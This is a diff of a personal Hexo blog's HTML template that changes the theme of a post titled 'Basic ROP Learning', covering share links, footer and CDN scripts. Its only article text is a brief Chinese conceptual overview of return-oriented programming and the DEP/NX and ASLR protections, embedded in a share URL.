+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&text=Basic ROP Learning"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&is_video=false&description=Basic ROP Learning"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Basic ROP Learning&body=Check out this article: https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&name=Basic ROP Learning&description=&lt;h2 id=&#34;Basic-ROP-Learning&#34;&gt;&lt;a href=&#34;#Basic-ROP-Learning&#34; class=&#34;headerlink&#34; title=&#34;Basic-ROP-Learning&#34;&gt;&lt;/a&gt;Basic-ROP-Learning&lt;/h2&gt;&lt;h2 id=&#34;ROP-Return-Oriented-Programming-概述&#34;&gt;&lt;a href=&#34;#ROP-Return-Oriented-Programming-概述&#34; class=&#34;headerlink&#34; title=&#34;ROP(Return-Oriented Programming)概述&#34;&gt;&lt;/a&gt;ROP(Return-Oriented Programming)概述&lt;/h2&gt;&lt;p&gt;ROP(Return-Oriented Programming)是一种高级的&lt;strong&gt;代码复用攻击技术&lt;/strong&gt;，主要用于绕过现代操作系统的安全防护机制（如DEP&amp;#x2F;NX）。其核心思想是在&lt;strong&gt;栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1-基本概念&#34;&gt;&lt;a href=&#34;#1-基本概念&#34; class=&#34;headerlink&#34; title=&#34;1. 基本概念&#34;&gt;&lt;/a&gt;1. &lt;strong&gt;基本概念&lt;/strong&gt;&lt;/h3&gt;&lt;h4 id=&#34;（1）产生背景&#34;&gt;&lt;a href=&#34;#（1）产生背景&#34; class=&#34;headerlink&#34; title=&#34;（1）产生背景&#34;&gt;&lt;/a&gt;（1）产生背景&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;DEP&amp;#x2F;NX防护&lt;/strong&gt;：现代系统禁止执行栈&amp;#x2F;堆上的代码（数据执行保护）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;ASLR防护&lt;/strong&gt;：随机化内存布局，增加预测难度。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;ROP应对方案&lt;/strong&gt;：复用已有代码（&lt;code&gt;.text&lt;/code&gt;段），避免直接注入shellcode。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&t=Basic ROP Learning"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>目录</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
+
   </div>
 </div>
 
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-  
-  
-
-
-
-
-
-
-
-
-
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
     
-
     
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
+    2025
+    zer0ptr
   </div>
-</div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/zer0ptr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
 
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
-  
-  
-  
-</div>
+    <!-- styles -->
 
-  </footer>
 
-  <!-- Scripts -->
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
   
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
     })
+  })
   </script>
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Disqus Comments -->
 
+<!-- utterances Comments -->
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  
-      <script>
-        if (!window.MathJax) {
-          window.MathJax = {
-            tex    : {
-              inlineMath: { '[+]': [['$', '$']] }
-            },
-            loader : {
-              load: ['ui/lazy']
-            },
-            options: {
-              renderActions: {
-                insertedScript: [200, () => {
-                  document.querySelectorAll('mjx-container').forEach(node => {
-                    let target = node.parentNode;
-                    if (target.nodeName.toLowerCase() === 'li') {
-                      target.parentNode.classList.add('has-jax');
-                    }
-                  });
-                }, '', false]
-              }
-            }
-          };
-        } else {
-          MathJax.startup.document.state(0);
-          MathJax.texReset();
-          MathJax.typeset();
-          MathJax.typesetPromise();
-        }
-
-        Fluid.events.registerRefreshCallback(function() {
-          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
-            MathJax.startup.document.state(0);
-            MathJax.texReset();
-            MathJax.typeset();
-            MathJax.typesetPromise();
-          }
-        });
-      </script>
-    
-
-  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
 </body>
 </html>
